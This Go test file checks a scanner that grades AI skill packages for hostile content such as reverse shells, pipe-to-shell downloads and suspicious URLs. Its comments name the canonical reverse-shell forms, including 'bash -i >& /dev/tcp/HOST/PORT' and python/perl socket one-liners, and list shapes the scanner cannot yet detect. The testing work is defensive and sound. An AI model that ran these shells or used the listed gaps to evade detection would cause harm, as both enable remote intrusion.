package main

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/velzepooz/skill-detector/pkg/axes"
	"github.com/velzepooz/skill-detector/pkg/rules"
	"github.com/velzepooz/skill-detector/pkg/scanner"
)

// The adversarial corpus is the second gate this engine needs, and the one
// the 906-sample bench cannot be. Corpus measurement prices what a
// suppression COSTS; only constructed cases price what it costs to leave a
// suppression's hole open. Every shape here is absent from MalSkillBench, so
// a bench re-run is byte-identical whether these pass or fail.
//
// Assertions are GRADE-level on a NAMED AXIS, not rule-level: what regressed
// when networkCallRule's demotions were wrong was the grade a user sees, and
// a rule-level assertion passes happily while the finding is demoted to an
// axis nobody gates on.
//
// Each case is a whole skill package under testdata/adversarial/<dir>/.

type adversarialCase struct {
	dir string
	// axis the assertion is about.
	axis axes.Axis
	// atLeast: the grade must be this or WORSE (attack cases).
	// atMost:  the grade must be this or BETTER (control cases).
	// Exactly one is set.
	atLeast, atMost string
	why             string
}

var adversarialCases = []adversarialCase{
	// --- Attack cases: each graded A on the security axis before the
	// demotion-policy rework, every one of them in a SKILL.md. ---
	{dir: "h1-printed-url-then-reverse-shell", axis: axes.Security, atLeast: "D",
		why: "endpointFinding demoted on `declared` alone and never asked what the statement runs"},
	{dir: "h2-suspicious-url-second", axis: axes.Security, atLeast: "D",
		why: "suspiciousEndpoint saw only the FIRST URL of the statement, so argument order decided the grade"},
	{dir: "h2-suspicious-url-first", axis: axes.Security, atLeast: "D",
		why: "the same statement with the URLs swapped — pins the symmetry the order-dependence broke"},
	{dir: "h3-continuation-reverse-shell", axis: axes.Security, atLeast: "D",
		why: "the call sat on a backslash continuation, so the call regexes never saw it and no finding was emitted at all"},
	{dir: "download-powershell", axis: axes.Security, atLeast: "D",
		why: "a PowerShell download from an IP literal sharing a line with a printed URL — caught as a bare routable-IP reference, not as a call"},
	{dir: "two-urls-one-suspicious", axis: axes.Security, atLeast: "D",
		why: "one statement naming a benign URL and a suspicious one — the suspicious host must be reached whichever position it is in"},
	{dir: "pipe-to-shell", axis: axes.Security, atLeast: "D",
		why: "download-and-run is never a documented endpoint"},

	// --- Control cases: over-escalating these is the cost side of the
	// policy, and each is a shape measured on the bench corpus. They must
	// stay demoted. ---
	{dir: "control-declared-endpoint", axis: axes.Security, atMost: "A",
		why: "a bare declared endpoint in a manifest is a disclosure, not a call to defend against"},
	{dir: "control-assignment-capture", axis: axes.Security, atMost: "A",
		why: "`VAR=$(curl …)` is the statement's own substitution, not a second command — 17 benign corpus findings, 4 samples"},
	{dir: "control-markdown-inline-code", axis: axes.Security, atMost: "A",
		why: "a command written in markdown inline code is still one command; backticks here are markup, not substitution"},
	{dir: "control-redirect-to-file", axis: axes.Security, atMost: "A",
		why: "redirection measured 25 benign findings against 2 malicious ones — vetoing it runs the wrong way"},
}

// uncoveredShapes are attacks NO rule in this engine detects. They are not
// demotion failures: nothing demotes them, because nothing finds them. Each
// produces zero findings and grades A across every axis.
//
// They are committed, and asserted, on purpose. A gap recorded only in a
// document is a gap that gets forgotten; a gap with a test is one that
// announces itself the moment somebody closes it. This test FAILS when a
// case starts being detected — the signal to move it into adversarialCases
// above with the grade it now earns.
//
// What is missing is a reverse-shell rule. `bash -i >& /dev/tcp/HOST/PORT`,
// `python3 -c "import socket…pty.spawn"` and the perl `Socket`+`exec`
// one-liner are the three canonical spellings, and SD-007 only ever saw them
// because a URL happened to share the line. Adding that rule registers a new
// ID and MOVES THE RULESET CHECKSUM, which is why it is not done here: the
// checksum is pinned in three downstream places and moving it is a release
// step, not a bugfix.
var uncoveredShapes = []adversarialCase{
	{dir: "revshell-dev-tcp", axis: axes.Security,
		why: "no rule matches a /dev/tcp redirection"},
	{dir: "revshell-python", axis: axes.Security,
		why: "no rule matches an inline python socket+pty payload"},
	{dir: "revshell-perl", axis: axes.Security,
		why: "no rule matches an inline perl Socket+exec payload"},
}

func TestAdversarial_UncoveredShapes(t *testing.T) {
	reg := rules.DefaultRegistry()
	for _, tc := range uncoveredShapes {
		t.Run(tc.dir, func(t *testing.T) {
			sc := scanner.New(reg, scanner.Options{Version: "test"})
			res, err := sc.Scan(context.Background(),
				benchDir(filepath.Join("testdata", "adversarial", tc.dir)))
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			if len(res.Findings) != 0 {
				t.Errorf("this shape is now DETECTED (%d findings) — %s no longer holds.\n"+
					"Move %s into adversarialCases with the grade it earns, and delete it here.",
					len(res.Findings), tc.why, tc.dir)
			}
		})
	}
}

func TestAdversarial_DemotionPolicy(t *testing.T) {
	reg := rules.DefaultRegistry()
	for _, tc := range adversarialCases {
		t.Run(tc.dir, func(t *testing.T) {
			sc := scanner.New(reg, scanner.Options{Version: "test"})
			res, err := sc.Scan(context.Background(),
				benchDir(filepath.Join("testdata", "adversarial", tc.dir)))
			if err != nil {
				t.Fatalf("scan: %v", err)
			}
			ar, ok := res.Axes[tc.axis]
			if !ok {
				t.Fatalf("no %s axis in the result — nothing was scanned", tc.axis)
			}
			switch {
			case tc.atLeast != "":
				if gradeAtLeastAsBad(ar.Grade, tc.atLeast) {
					return
				}
				t.Errorf("%s graded %s, want %s or worse\n  why: %s\n  rationale: %s",
					tc.axis, ar.Grade, tc.atLeast, tc.why, ar.Rationale)
			case tc.atMost != "":
				if !gradeAtLeastAsBad(ar.Grade, tc.atMost) || ar.Grade == axes.Grade(tc.atMost) {
					return
				}
				t.Errorf("%s graded %s, want %s or better\n  why: %s\n  rationale: %s",
					tc.axis, ar.Grade, tc.atMost, tc.why, ar.Rationale)
			default:
				t.Fatal("case sets neither atLeast nor atMost")
			}
		})
	}
}

var adversarialGradeRank = map[axes.Grade]int{"A": 0, "B": 1, "C": 2, "D": 3, "F": 4}

// gradeAtLeastAsBad reports whether got is want or worse on the A<B<C<D<F
// scale.
func gradeAtLeastAsBad(got axes.Grade, want string) bool {
	g, ok1 := adversarialGradeRank[got]
	w, ok2 := adversarialGradeRank[axes.Grade(want)]
	return ok1 && ok2 && g >= w
}
